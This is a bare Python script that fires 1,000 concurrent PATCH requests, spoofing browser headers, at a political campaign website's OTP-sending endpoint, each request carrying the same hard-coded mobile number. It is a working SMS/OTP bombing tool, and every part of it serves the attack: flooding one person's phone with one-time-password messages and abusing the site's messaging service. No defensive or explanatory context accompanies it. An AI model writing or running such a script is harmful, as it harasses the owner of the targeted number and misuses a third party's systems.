import requests
from requests_toolbelt.multipart.encoder import MultipartEncoder
from concurrent.futures import ThreadPoolExecutor, as_completed

# Define the URL
url = "https://ekbaarphirsemodisarkar.com/api/v1/user/send_otp_mobile?language=en"

# Define the headers template
headers_template = {
    "Accept": "*/*",
    "Accept-Encoding": "gzip, deflate, br, zstd",
    "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
    "Cache-Control": "no-cache",
    "Connection": "keep-alive",
    "Host": "ekbaarphirsemodisarkar.com",
    "Origin": "https://phirekbaarmodisarkar.bjp.org",
    "Pragma": "no-cache",
    "Referer": "https://phirekbaarmodisarkar.bjp.org/",
    "Sec-Fetch-Dest": "empty",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Site": "cross-site",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "sec-ch-ua": '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": '"Windows"'
}

def send_request(url, headers_template):
    # Define the payload with the specified boundary
    m = MultipartEncoder(
        fields={
            'mobile': '9056025696'
        }
    )

    # Copy headers and update Content-Type to include the boundary
    headers = headers_template.copy()
    headers['Content-Type'] = m.content_type

    response = requests.patch(url, headers=headers, data=m)
    return response.status_code, response.text

# Number of concurrent threads
num_threads = 20

# List to store futures
futures = []

# Create a ThreadPoolExecutor
with ThreadPoolExecutor(max_workers=num_threads) as executor:
    for _ in range(1000):
        # Submit the request to the executor
        future = executor.submit(send_request, url, headers_template)
        futures.append(future)

    # Process the results as they complete
    for future in as_completed(futures):
        status_code, response_text = future.result()
        print(f"Status Code: {status_code}")
        print(f"Response Text: {response_text}")
